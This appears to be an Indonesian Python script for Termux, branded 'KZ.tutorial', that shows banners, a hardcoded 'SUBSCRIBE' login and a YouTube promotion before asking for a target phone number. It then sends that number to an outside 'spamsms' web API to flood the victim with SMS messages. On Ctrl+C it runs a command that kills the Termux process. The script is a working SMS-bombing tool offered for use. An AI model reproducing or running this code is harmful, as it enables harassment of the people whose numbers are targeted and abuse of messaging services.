import sys,os,json,requests,random,time
from getpass import getpass
from flask import Flask,request
from flask_cors import CORS
from flask_restful import Resource,Api
import requests,json
from getpass import getpass
import itertools
import threading
localtime = time.asctime(time.localtime(time.time()))

def mengetik(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)

app=Flask(__name__)
CORS(app)
api=Api(app)

'\033[90m',
'\033[31m',
'\033[32m',
'\033[33m',
'\033[94m',
'\033[35m',
'\033[36m',
'\033[37m',
'\033[0m',
'\033[36;1m',
os.system('clear')
mengetik('\033[32m❗❗❗SEBELUM LANJUT PERIKSAH DULUH KONEKSIH INTERNET❗❗❗\033[32m ')
mengetik('\033[32mKALO KALO INTERNET  BAIK" SAJA MARIH KITA GUASKEN CUY\033[33m')
time.sleep(8)
os.system('clear')
print ("\033[94m  ╔═══════╗\033[94m")
print ("\033[94m  ║       ║\033[94m       \033[31m[\033[31m\033[33m Tools KZ.tutorial\033[33m\033[31m ] \033[31m")
print ("\033[94m╔═══════════╗\033[94m")
print ("\033[94m║\033[94m \033[32mL O G I N \033[32m\033[94m║\033[94m   \033[31m[\033[33m \033[37mCreator\033[37m\033[37m :\033[37m\033[32m Juliopangkey\033[32m\033[31m ] \033[31m")
print ("\033[94m║\033[94m \033[37m BERUTAL\033[37m \033[94m ║\033[94m   \033[31m[\033[31m\033[37m Youtube\033[37m \033[37m:\033[37m\033[32m KZ.TUTORIAL\033[32m\033[31m ] \033[31m")
print ("\033[94m╚═══════════╝\033[94m")
print ('')
print (' \033[94m[\033[94m\033[33m*\033[33m\033[94m]\033[94m\033[37m\033[31m[ \033[31m\033[37mLogin Username dan pasword download link dibawa\033[37m\033[31m ]\033[31m')
print (' \033[94m[\033[94m\033[33m*\033[33m\033[94m]\033[94m\033[37m\033[31m[\033[31m\033[37m Link\033[37m \033[31m]\033[31m\033[37m\033[33m :\033[33m \033[31m[\033[31m\033[32m bit.ly/3rRUKCNmediafirecom\033[32m\033[31m ]\033[31m')
def menu():
      while True:
           print("")
           try:
                x = str(input('\033[1;34mUsername \033[1;93m: '))
                print("")
                e = getpass('\033[1;36mPassword \033[1;93m: ')
                print ("")
                if x=="SUBSCRIBE" and e=="KZ.TUTORIAL":
                   print('Tunggu Sebentar...')
                   time.sleep(2)
                   os.system('clear')
                   print('')
                   time.sleep(2)
                   break
                else:
                      print("\033[1;91m     Wrong Password")
                      time.sleep(2)
           except Exception:
                      print("\033[1;91m     Wrong Password")
                      time.sleep(2)
           except KeyboardInterrupt:
                      os.system('killall -9 com.termux')
                      print("\033[1;91m     Wrong Password")
                      time.sleep(2)
menu()
time.sleep(2)
mengetik('\033[32mSUBSCRIBE DULUH YT KZ.TUTORIAL BIAR WORK ❗❗❗\033[32m')
time.sleep(3)
os.system('xdg-open https://youtube.com/channel/UCRaVHUXQGVAH7Gof7kixIoQ')
os.system('clear')
# Subscribe dulu :)
time.sleep(2)
os.system('clear')
banner = ("""
\033[1;96m  ╔═════════════════════════════════════════╗
\033[1;96m  ║\033[1;95m ____  ____  ____  __  __  __  __  _  _  \033[1;96m║
\033[1;96m  ║\033[1;95m(_  _)( ___)(  _ \(  \/  )(  )(  )( \/ ) \033[1;96m║
\033[1;96m  ║\033[1;95m  )(   )__)  )   / )    (  )(__)(  )  (  \033[1;96m║
\033[1;96m  ║\033[1;95m (__) (____)(_)\_)(_/\/\_)(______)(_/\_) \033[1;96m║
\033[1;96m  ║            TOOLS By KZ.TUTORIAL         ║
\033[1;96m  ╚═════════════════════════════════════════╝
""")
print (banner)
time.sleep(3)
mengetik('\033[1;96m╔══════════════════════════════════════════════════╗')
mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Creator\033[1;93m: \033[1;92mKz.tutorial")
mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Github\033[1;93m : \033[1;92mgithub.com/Kz.tutorial.git")
mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Status\033[1;93m : \033[1;92mSelalu Online")
mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Version\033[1;93m: \033[1;92mv2.5.1")
mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Waktu\033[1;93m  : \033[1;92m"+localtime)
mengetik('\033[1;96m═══════════════════════════════════════════════════')
mengetik('\033[1;96m═══════════════════════════════════════════════════\033[1;96m')
mengetik('\033[33m•••••••••\033[33m\033[37m SELAMAT\033[37m \033[33mDATANG\033[33m \033[37m DI\033[37m\033[33m TOOLS\033[33m\033[37m KAMI\033[37m\033[33m •••••••••••')
mengetik('\033[1;96m═══════════════════════════════════════════════════\033[1;96m')
mengetik('\033[1;96m═══════════════════════════════════════════════════\033[1;96m')
mengetik('\033[35m[\033[35m\033[37m+\033[37m\033[35m]\033[35m\033[35m \033[33mNegara Kamu\033[33m \033[37m \033[36m:\033[36m\033[37m Indonesia\033[37m')
mengetik('\033[35m[\033[35m\033[37m+\033[37m\033[35m]\033[35m\033[37m \033[33mpenguna tools \033[33m \033[36m:\033[36m \033[94m2133\033[94m \033[37morang\033[37m')
mengetik('\033[35m[\033[35m\033[37m+\033[37m\033[35m]\033[35m\033[33m \033[33mStatus pengguna \033[33m \033[36m:\033[36m \033[32monline\033[32m')
mengetik('\033[35m[\033[35m\033[37m+\033[37m\033[35m]\033[35m\033[37m \033[33mSecript Sms Brutal \033[33m \033[36m:\033[36m \033[32mON\033[32m')
mengetik('\033[1;96m═══════════════════════════════════════════════════ \033[1;96m')
mengetik('\033[1;96m═══════════════════════════════════════════════════\033[1;96m')
mengetik('\033[35m[\033[35m\033[37m*\033[37m\033[35m]\033[35m\033[32m Dosa tanggung sendiri !\033[32m')
mengetik('\033[35m[\033[35m\033[37m1\033[37m\033[35m]\033[35m \033[32mguasken metode 1 \033[32m')
mengetik('\033[35m[\033[35m\033[37m2\033[37m\033[35m]\033[35m \033[32mGuasken Spam metode 2\033[32m')
mengetik("\033[35m[\033[35m\033[37m3\033[37m\033[35m]\033[35m \033[37mkeluar/exit\033[37m\033[31m (Ctrl+C enter\033[31m)")
mengetik('\033[1;96m════════════════════════════════════════════════════\033[1;96m')
print ('\033[35m[\033[35m\033[37m+\033[37m\033[35m]\033[35m\033[32m Nomor diawali\033[32m\033[37m 8xxxx\033[37m')
nomor = input('\033[35m[\033[35m\033[37m+\033[37m\033[35m]\033[35m\033[37m Nomor target\033[37m\033[36m :\033[36m ')
req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
if 'terkirim' in req:
     print ('SPAM BERHASIL')
else:
     print ('Spam GAGAL')
